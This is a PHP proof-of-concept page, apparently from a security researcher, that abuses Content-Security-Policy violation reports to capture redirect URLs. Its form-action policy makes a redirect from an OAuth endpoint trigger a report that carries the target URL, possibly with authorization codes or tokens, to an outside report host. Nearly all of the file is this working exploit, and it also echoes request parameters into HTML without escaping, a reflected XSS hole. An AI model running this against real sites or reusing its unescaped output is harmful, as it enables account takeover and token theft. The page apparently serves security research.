<?php
  $url = isset($_REQUEST['url'])?$_REQUEST['url']:false;
  $domain = isset($_REQUEST['domain'])?$_REQUEST['domain']:false;
  $report_uri = isset($_REQUEST['report-uri'])?$_REQUEST['report-uri']:'https://raw.cm2.pw?csp-report';

  if(!$url || !$domain){
    header('Content-type: text/plain;charset=utf-8', true, 200);
    die(<<<'EOF'
    Usage:
    http://cm2.pw/csp-playground?domain=auth.example.com&url=https://auth.example.com/oauth

    Parameters:
    url     -   URL issuing a redirect
    domain  -   CSP whitelisted domain
    report-uri - URL to send csp-rport to (default: https://raw.cm2.pw?csp-report)
    EOF);
  }
  header("Content-Security-Policy-Report-Only: default-src 'unsafe-inline' 'self'; form-action {$domain}; report-uri {$report_uri}", true, 200);
?>

<!DOCTYPE html>
<html>
<head>
  <title>CSP Violation Reports - Playground</title>
  <script>
    function exploit() {
      window.open('about:blank','_blank').close();
      document.getElementById('#form').submit();
    }
  </script>
</head>
<body>
    <form target="_self" id="form" action="<?php print(urldecode($url));?>" method="GET"></form>
    Domain: <input disabled title="domain" value="<?php print(urldecode($domain));?>"/><br>
    URL: <input disabled title="url" value="<?php print(urldecode($url));?>"/><br>
    Report URI: <input disabled title="report-uri" value="<?php print(urldecode($report_uri));?>"/><br>
    <button onclick="exploit()">Exploit</button>
</body>
</html>
